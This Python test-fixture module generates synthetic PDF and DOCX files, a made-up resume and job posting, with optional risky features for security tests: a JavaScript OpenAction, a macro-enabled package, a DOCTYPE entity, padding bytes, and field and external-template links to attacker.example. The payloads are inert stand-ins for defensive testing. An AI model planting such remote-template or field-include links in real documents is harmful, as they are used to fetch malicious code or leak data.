"""Synthetic documents for Milestone 10 tests. Nothing here is a real person's document.

The PDF writer produces a small, valid classic PDF (catalog, page tree, one Helvetica font, one content
stream per page, an xref table), optionally Flate-compressed, optionally with a `/ToUnicode` CMap on a
two-byte (Type0-style) font, optionally encrypted-looking, optionally carrying active content. The DOCX
writer produces a minimal WordprocessingML package, optionally macro-enabled, optionally with an
external relationship, a DOCTYPE, or a field instruction.
"""

import io
import zipfile
import zlib

SYNTHETIC_RESUME_LINES = (
    "Alex Example",
    "alex.example@example.test | +1 555 010 0199",
    "Portfolio https://portfolio.example.test/alex",
    "Experience",
    "Senior Python engineer building durable agent runtimes with PostgreSQL and Playwright.",
    "Skills",
    "Python, TypeScript, PostgreSQL, Playwright, Electron, security reviews.",
)

SYNTHETIC_JOB_LINES = (
    "Job description: Agent Platform Engineer",
    "Requirements",
    "Python and PostgreSQL experience, Playwright automation, security reviews.",
    "Nice to have: Rust, Kubernetes.",
)


def _escape(text: str) -> str:
    return text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")


def make_pdf(
    pages: list[list[str]] | None = None,
    *,
    compress: bool = True,
    to_unicode: bool = False,
    encrypted: bool = False,
    active_content: bool = False,
    image_only: bool = False,
) -> bytes:
    pages = pages if pages is not None else [list(SYNTHETIC_RESUME_LINES)]
    objects: list[bytes] = []

    def add(body: bytes) -> int:
        objects.append(body)
        return len(objects)

    catalog_extra = b" /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>" if active_content else b""
    catalog = add(b"")  # placeholder, filled below
    pages_id = add(b"")
    if to_unicode:
        cmap = (
            b"/CIDInit /ProcSet findresource begin 12 dict begin begincmap\n"
            b"1 begincodespacerange <0000> <FFFF> endcodespacerange\n"
            b"1 beginbfrange <0020> <007E> <0020> endbfrange\n"
            b"endcmap CMapName currentdict /CMap defineresource pop end end"
        )
        cmap_id = add(b"<< /Length %d >>\nstream\n" % len(cmap) + cmap + b"\nendstream")
        font_id = add(
            b"<< /Type /Font /Subtype /Type0 /BaseFont /Synthetic /Encoding /Identity-H /ToUnicode %d 0 R >>" % cmap_id
        )
    else:
        font_id = add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>")
    page_ids: list[int] = []
    for lines in pages:
        if image_only:
            content = b"q 100 0 0 100 0 0 cm Q"
        else:
            parts = [b"BT /F1 12 Tf 72 720 Td"]
            for index, line in enumerate(lines):
                if to_unicode:
                    encoded = b"<" + "".join(f"{ord(c):04X}" for c in line).encode() + b">"
                else:
                    encoded = b"(" + _escape(line).encode("cp1252") + b")"
                if index:
                    parts.append(b"0 -16 Td")
                parts.append(encoded + b" Tj")
            parts.append(b"ET")
            content = b"\n".join(parts)
        if compress:
            data = zlib.compress(content)
            stream = b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(data) + data + b"\nendstream"
        else:
            stream = b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream"
        content_id = add(stream)
        page_ids.append(
            add(
                b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 %d 0 R >> >> /Contents %d 0 R >>"
                % (pages_id, font_id, content_id)
            )
        )
    objects[catalog - 1] = b"<< /Type /Catalog /Pages %d 0 R%s >>" % (pages_id, catalog_extra)
    kids = b" ".join(b"%d 0 R" % page for page in page_ids)
    objects[pages_id - 1] = b"<< /Type /Pages /Kids [%s] /Count %d >>" % (kids, len(page_ids))
    encrypt_id = add(b"<< /Filter /Standard /V 1 /R 2 /O <00> /U <00> /P -4 >>") if encrypted else None

    out = io.BytesIO()
    out.write(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for number, body in enumerate(objects, start=1):
        offsets.append(out.tell())
        out.write(b"%d 0 obj\n" % number + body + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1))
    for offset in offsets:
        out.write(b"%010d 00000 n \n" % offset)
    trailer = b"<< /Size %d /Root %d 0 R" % (len(objects) + 1, catalog)
    if encrypt_id is not None:
        trailer += b" /Encrypt %d 0 R /ID [<00> <00>]" % encrypt_id
    out.write(b"trailer\n" + trailer + b" >>\nstartxref\n%d\n%%%%EOF\n" % xref)
    return out.getvalue()


_CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" ContentType="{main}"/>'
    "</Types>"
)
_DOCX_MAIN = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
_DOCM_MAIN = "application/vnd.ms-word.document.macroEnabled.main+xml"
_ROOT_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
    "</Relationships>"
)


def make_docx(
    lines: tuple[str, ...] | list[str] = SYNTHETIC_RESUME_LINES,
    *,
    macro: bool = False,
    external_template: bool = False,
    doctype: bool = False,
    field_instruction: bool = False,
    bomb_bytes: int = 0,
) -> bytes:
    paragraphs = "".join(
        f'<w:p><w:r><w:t xml:space="preserve">{line.replace("&", "&amp;").replace("<", "&lt;")}</w:t></w:r></w:p>' for line in lines
    )
    if field_instruction:
        paragraphs += '<w:p><w:r><w:instrText>INCLUDETEXT "http://attacker.example/x"</w:instrText></w:r></w:p>'
    prolog = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    if doctype:
        prolog += '<!DOCTYPE w [<!ENTITY x "boom">]>'
    document = (
        prolog + '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f"<w:body>{paragraphs}</w:body></w:document>"
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        + (
            '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="https://attacker.example/template.dotm" TargetMode="External"/>'
            if external_template
            else ""
        )
        + "</Relationships>"
    )
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", _CONTENT_TYPES.format(main=_DOCM_MAIN if macro else _DOCX_MAIN))
        archive.writestr("_rels/.rels", _ROOT_RELS)
        archive.writestr("word/document.xml", document)
        archive.writestr("word/_rels/document.xml.rels", rels)
        if macro:
            archive.writestr("word/vbaProject.bin", b"\x00" * 64)
        if bomb_bytes:
            archive.writestr("word/media/padding.bin", b"\x00" * bomb_bytes)
    return buffer.getvalue()


def make_text(lines: tuple[str, ...] | list[str] = SYNTHETIC_JOB_LINES) -> bytes:
    return ("\n".join(lines) + "\n").encode("utf-8")
